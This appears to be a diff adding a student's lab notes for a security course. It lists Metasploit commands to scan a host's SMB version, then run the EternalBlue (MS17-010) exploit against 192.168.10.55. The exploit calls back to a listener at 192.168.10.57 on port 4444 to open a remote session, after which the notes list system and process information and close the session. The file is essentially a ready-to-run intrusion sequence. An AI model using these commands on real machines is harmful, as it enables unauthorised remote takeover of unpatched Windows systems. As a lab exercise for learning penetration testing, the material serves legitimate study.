@@ -1,0 +1,27 @@
+List of commands:
+
+-Scanning
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.10.55
+run
+exit
+
+-Exploiting
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.10.55
+set LHOST 192.168.10.57
+set LPORT 4444
+run
+-Session 1 is online
+
+-Getting list of processes
+sysinfo
+ps
+sessions -k 1
+exit
+
+-Git repository link
+https://github.com/amnakhan19/information_sec.git
